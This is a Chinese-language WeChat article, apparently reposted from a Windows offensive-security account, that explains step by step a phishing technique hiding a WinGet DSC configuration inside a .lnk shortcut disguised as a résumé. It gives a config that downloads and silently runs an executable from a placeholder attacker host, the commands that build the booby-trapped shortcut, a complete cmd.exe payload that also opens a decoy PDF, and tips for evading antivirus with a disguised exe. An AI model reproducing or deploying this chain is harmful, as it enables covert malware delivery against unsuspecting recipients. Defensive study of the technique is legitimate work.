---
title: 新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件
url: https://mp.weixin.qq.com/s/swR1OomJ7-Ts8GHHvEPdEw
source: Doonsec's feed
date: 2026-04-27
fetch_date: 2026-04-28T05:24:25.139306
---

# 新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/5FtPcWDnic0cf9ncmWoRpMUKSfj4JueslmrTsI3aIvuK5cMcXQmnQcj20AAVErKmFOwJMMplnvI1Sdw75204DCNqdBXvUlw5F66HbENxpLes/0?wx_fmt=jpeg)

# 新型社工钓鱼伪装技术之WinGet配置文件+Lnk文件

渗透云记

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

编者荐语：

感谢师傅分享的知识点，这是一种把 WinGet 配置藏进 Lnk、伪装成文档的新型钓鱼手法，利用系统自带工具静默执行恶意代码，隐蔽性强、检测难度高。

以下文章来源于卡卡罗特取西经
，作者ybdt

![](http://wx.qlogo.cn/mmhead/oYwP0cFmRU1JzdBSpofTZFeic4a9YKMlrQa2kBQEVHPEaTtxo2g1HlN2eS9Vo14428FUo9ATmujc/0)

**卡卡罗特取西经**
.

专注于Windows终端攻防

# 01 前言

Winget钓鱼是一种容易被防御者忽视的钓鱼方式，以至于公开的文件滥用后缀中并没有它：https://filesec.io/

本文会详细介绍这种新的钓鱼伪装技术，包括漏洞复现、涉及的概念，如何一步步构造及原理

# 02 漏洞复现

压缩包内有Lnk文件jianli.lnk
![image](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0dJibInDSlaUicibyjeVrtE8ibY0gZKQufM0FXblEZW1TOjpV8FibNSXPPUfZshibhGsx08iclGMicXZ39KQBIG1LjzrQxCicfs0lgZQvDs/640?wx_fmt=png&from=appmsg)

image

双击jianli.lnk后可以看到成功弹出了伪装的pdf文档，并下载执行了putty.exe
![image](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0eicjvFFfppTmOm7OeCMmIfwa6VvIgyGpr1Fo6x8yAib7eqBoBILtfmuVnHjZcHibYlAR17r7FibtpNqmUduqQnNoVPt6wBZicIQMlQ/640?wx_fmt=png&from=appmsg)

image

# 03 前置知识

## 3.1 Powershell/Microsoft Desired State Configuration

首先Powershell DSC(Desired State Configuration) 和 Microsoft DSC(Desired State Configuration)是同一个东西，只不过Microsoft DSC为了跨平台，基于跨平台的Powershell 7构建，可以理解为Powershell DSC的升级版

PowerShell DSC (Desired State Configuration) 是 Windows PowerShell 中的一项配置管理框架，用于以声明式方式定义和自动维持系统的“期望状态”（Desired State）。

你可以把它理解为：“直接告诉系统应该是什么样子，而不是一步步教它怎么做。”

1. 1. 声明式配置（Declarative）
   DSC 使用类似配置文件的方式描述目标状态，例如：
   某个服务必须运行
   某个文件必须存在
   某个注册表键必须设置为某值
   而不是写脚本一步步执行。
2. 2. 三大组件
    （1）Configuration（配置）
    用 PowerShell 写的 DSL，描述目标状态，含义：确保 IIS 已安装

   ```
   Configuration MyConfig {
       Node "localhost" {
           WindowsFeature IIS {
               Name = "Web-Server"
               Ensure = "Present"
           }
       }
   }
   ```

   （2）Resource（资源）
    DSC 的最小执行单元，每个资源负责管理一种状态。
    常见资源类型：File（文件）、Service（服务）、Registry（注册表）、WindowsFeature（系统组件）
    资源本质是一个 PowerShell 模块，实现三个方法：Get（当前状态）、Test（是否符合期望状态）、Set（修复到期望状态）
    （3）LCM（Local Configuration Manager）
    DSC 的核心引擎，运行在每台目标机器上
    负责：应用配置、定期检查状态、自动修复
3. 3. 工作流程
   DSC 的执行流程如下：
   编写 Configuration -> 编译为 MOF 文件（Managed Object Format） -> LCM 读取 MOF -> 执行 Resource -> 持续监控并保持状态一致
4. 4. 运行模式
   1.Push 模式
   管理端主动推送配置到目标机器，适合小规模或临时配置
   2.Pull 模式
   节点主动从服务器拉取配置，类似于：Puppet、Chef、Ansible，更适合大规模环境

# 04 漏洞分析

测试环境：Windows 10 22H2 19045.6466

## 4.1 受害者点击情况分析

#### 受害者在压缩软件中直接双击文件

1. 1. 7zip
   在7zip中直接双击快捷方式，快捷方式实际被解压到 %TMP%\7zO4562D2C3 下
   ![image](https://mmbiz.qpic.cn/sz_mmbiz_png/5FtPcWDnic0eS9aERTZNwD5OE653yuDNYt9ZGcMNtEBPEjiaicQHp2aoxgPMhd3mibAE0v79GSZ7b4icl4EomB2NDH58eKKcksicWJxxglRiaedZjg/640?wx_fmt=png&from=appmsg)

   image

在Winrar中直接双击快捷方式，快捷方式实际被解压到 %TMP%\Rar$DIa6744.14020.rartemp 下
![image](https://mmbiz.qpic.cn/mmbiz_png/5FtPcWDnic0fybRro8fmdGU5KFiaeKWngDVgD2tI56jMPcbz9dvaIWvHRt7kTt6HHw08W1JjcvdvWecLZOcDnClsnNzoBIwjEbWQpVwJzcjgM/640?wx_fmt=png&from=appmsg)

image

测试发现，关闭7zip和Winrar的窗口后，Rar$DIa6744.14020.rartemp  和 7zO4562D2C3 均会自动删除，我们想寻找以7z或Rar开头的目录，可以遍历%TMP%目录，来定位在压缩软件中打开的文件位置

#### 受害者解压缩后，在文件夹中双击文件

一般用户接收文件要么在下载（Downloads）目录，要么在桌面（Desktop）目录，所以受害者如果对压缩文件进行解压缩的话，解压后的文件夹通常在 Downloads 目录或者 Desktop 目录

## 4.2 构造winget配置文件

配置文件中干的事就是下载并执行putty.exe，将配置文件中的http://ip:port/putty.exe换成自己的地址，保存文件为conf.yml

简单讲解一下这个配置文件：比如DownloadFile这部分来说，DSC系统会检查TestScript，如果发现文件不存在，会返回false，返回false则执行SetScript，下载文件到指定位置，GetScript用来返回状态，ExecuteFile也同理，TestScript处直接赋值$false，表示总是执行SetScript，GetScript用来返回状态

```
properties:
  configurationVersion: 0.2
  resources:
    - resource: PSDscResources/Script
      id: DownloadFile
      directives:
        description: Download file
      settings:
        GetScript: |
          return @{ Result = (Test-Path "$env:LOCALAPPDATA\putty.exe") }
        TestScript: |
          Test-Path "$env:LOCALAPPDATA\putty.exe"
        SetScript: |
          Invoke-WebRequest -Uri "http://ip:port/putty.exe" -OutFile "$env:LOCALAPPDATA\putty.exe"

    - resource: PSDscResources/Script
      id: ExecuteFile
      dependsOn:
        - DownloadFile
      directives:
        description: Execute file
      settings:
        GetScript: |
          return @{ Result = $false }
        TestScript: |
          return $false
        SetScript: |
          Start-Process -FilePath "$env:LOCALAPPDATA\putty.exe" -WindowStyle Hidden
```

将配置文件改成一行形式如下

```
{properties: {configurationVersion: 0.2, resources: [{resource: "PSDscResources/Script", id: "DownloadFile", directives: {description: "Download file"}, settings: {GetScript: "return @{ Result = (Test-Path \"$env:LOCALAPPDATA\\putty.exe\") }", TestScript: "Test-Path \"$env:LOCALAPPDATA\\putty.exe\"", SetScript: "Invoke-WebRequest -Uri \"http://ip:port/putty.exe\" -OutFile \"$env:LOCALAPPDATA\\putty.exe\""}}, {resource: "PSDscResources/Script", id: "ExecuteFile", dependsOn: ["DownloadFile"], directives: {description: "Execute file"}, settings: {GetScript: "return @{ Result = $false }", TestScript: "return $false", SetScript: "Start-Process -FilePath \"$env:LOCALAPPDATA\\putty.exe\" -WindowStyle Hidden"}}]}}
```

可以执行下列命令测试配置文件是否生效，成功弹出putty.exe则生效

```
echo y | winget configure -f conf.yml
```

winget文件双击后，执行效果如下
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/5FtPcWDnic0cKpmS3nvl7vUWhlhGvsctibDjaae9u9Vgzh0UbDQVIAwgC7pibK6NotzEoVvmicwMYWumicosZibalpzUZcTMGp3IdoKRTEa2EOHEQ/640?wx_fmt=png&from=appmsg)

image

## 4.3 把winget配置文件附加到link文件的二进制内容中

使用如下命令将conf.yml附加到original.lnk文件后面

```
copy /b cmd.lnk + padding.txt + conf.yml jianli.lnk
```

可以执行如下命令验证，从1298行开始读的内容是否是配置文件

```
more +1298 update.lnk > a.txt
```

这里有2个坑，不知道可能会让你很难受

在 Windows 的命令行环境（CMD）中，more 命令是一个基于 文本流（Text Stream） 设计的古老工具。当它被迫处理 .lnk 这种二进制文件时，它会按照一套非常陈旧的逻辑来“强行”解释字节。

每当它扫到0x0A (LF，就是\n) 或者 0x0D 0x0A (CR+LF，就是\r\n)时，都会算作一个换行，但是二进制流中分布着大量随机的0x0A、0x0D 0x0A，导致精确计算偏移量会不稳定，所以通过一个技巧，现在lnk文件末尾添加1000个换行，再附加配置文件，配置文件内容前面即使有空行也不影响执行

再一个是截断符，在 more（以及很多早期的 DOS 工具）眼中，文件的真正终结者不是文件的大小（Size），而是0x1A (ASCII 26, Ctrl+Z / SUB)，当 more 读取文件流时，一旦遇到字节 0x1A，它会立即认为：“好的，文件到此结束了。”

## 4.4 构造一个用来迷惑受害者的pdf，托管在远程服务器

```
start http://ip:port/b.pdf
```

## 4.5 最终Payload

切换到lnk文件被提取的目录，使用more提取winget配置文件，启动伪造的pdf，使用提取的配置文件调用winget，还要注意lnk文件的259字符限制，最终payload如下

```
c:\windows\system32\cmd.exe /c "(cd %tmp%\7z* || cd %tmp%\Rar* || cd %userprofile%\Desktop) & (more +1000 *.lnk > %tmp%\conf.yml) & (start http://ip:port/b.pdf) & (echo y | winget configure -f %tmp%\conf.yml > nul)"
```

# 05 进一步探索

## 5.1 在线配置

有人提到，winget可以使用托管在远端的配置文件

```
winget configure --enable
winget configure http://ip:port/a.yml --accept-configuration-agreements
```

经过测试，并不行，至少在我的winget版本v1.28.220中不行，未来版本据说可能加这个功能
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/5FtPcWDnic0e6dRW9DOTOcJrRsGNhzfz1EpPOgt2F0snnlztvel5jWyHpmnhIUAT2QN3u1xqEj49CxkkThsnMLZRTMhibia8VdxLicjof11kjZc/640?wx_fmt=png&from=appmsg)

image

## 5.2 其他钓鱼方式

对于lnk落地就被查杀的360，可以换换思路，使用经典的exe钓鱼，用C++实现调用下列命令

```
winget configure conf.yml --accept-configuration-agreements --disable-interactivity
```

然后给exe改个图标，双重后缀视情况而定，由于执行链是exe调用winget，不存在明显的可疑特征，能绕过多数杀软的检测

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/7fvjX482azLapsPaDZpneu1VjNTprA9zO5DTQcutB6EHJnCOFoeFYnrHcHqxxeIfHYQJSzMNibZOu85xuRAYVOQ/0?wx_fmt=png)

渗透云记

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/7fvjX482azLapsPaDZpneu1VjNTprA9zO5DTQcutB6EHJnCOFoeFYnrHcHqxxeIfHYQJSzMNibZOu85xuRAYVOQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过